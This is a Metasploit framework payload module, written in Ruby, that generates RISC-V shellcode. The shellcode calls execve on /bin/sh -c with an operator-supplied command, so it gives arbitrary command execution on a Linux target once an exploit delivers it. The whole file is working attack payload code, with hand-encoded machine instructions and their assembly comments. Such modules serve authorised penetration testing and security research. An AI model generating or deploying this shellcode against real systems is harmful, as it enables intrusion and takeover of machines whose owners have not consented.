##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 96

  include Msf::Payload::Single

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Execute Command',
        'Description' => 'Execute an arbitrary command',
        'Author' => [
          'modexp', # cmd.s execve RISC-V 64-bit shellcode
          'bcoles', # metasploit
        ],
        'License' => BSD_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_RISCV32LE,
        'References' => [
          ['URL', 'https://modexp.wordpress.com/2022/05/02/shellcode-risc-v-linux/'],
          ['URL', 'https://github.com/odzhan/shellcode/blob/master/os/linux/riscv64/cmd.s'],
        ]
      )
    )
    register_options([
      OptString.new('CMD', [ true, 'The command string to execute' ]),
    ])
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    datastore['CMD'] || ''
  end

  def generate(_opts = {})
    shellcode =
      [0xfe010113].pack('V*') +  # addi sp,sp,-32
      [0x0dd00893].pack('V*') +  # li a7,221
      [0x6e696537].pack('V*') +  # lui a0,0x6e696
      [0x22f50513].pack('V*') +  # addi a0,a0,559 # 6e69622f <__global_pointer$+0x6e6848af>
      [0x00a12023].pack('V*') +  # sw a0,0(sp)
      [0x00687537].pack('V*') +  # lui a0,0x687
      [0x32f50513].pack('V*') +  # addi a0,a0,815 # 68732f <__global_pointer$+0x6759af>
      [0x00a12223].pack('V*') +  # sw a0,4(sp)
      [0x00010513].pack('V*') +  # mv a0,sp
      [0x000065b7].pack('V*') +  # lui a1,0x6
      [0x32d58593].pack('V*') +  # addi a1,a1,813 # 632d <_start-0x9d27>
      [0x00b12423].pack('V*') +  # sw a1,8(sp)
      [0x00810593].pack('V*') +  # addi a1,sp,8
      [0x00000617].pack('V*') +  # auipc a2,0x0
      [0x02460613].pack('V*') +  # addi a2,a2,36 # 100ac <cmd>
      [0x00a12623].pack('V*') +  # sw a0,12(sp)
      [0x00b12823].pack('V*') +  # sw a1,16(sp)
      [0x00c12a23].pack('V*') +  # sw a2,20(sp)
      [0x00012c23].pack('V*') +  # sw zero,24(sp)
      [0x00c10593].pack('V*') +  # addi a1,sp,12
      [0x00000613].pack('V*') +  # li a2,0
      [0x00000073].pack('V*') +  # ecall
      command_string + "\x00"

    # align our shellcode to 4 bytes
    shellcode += "\x00" while shellcode.bytesize % 4 != 0

    super.to_s + shellcode
  end
end
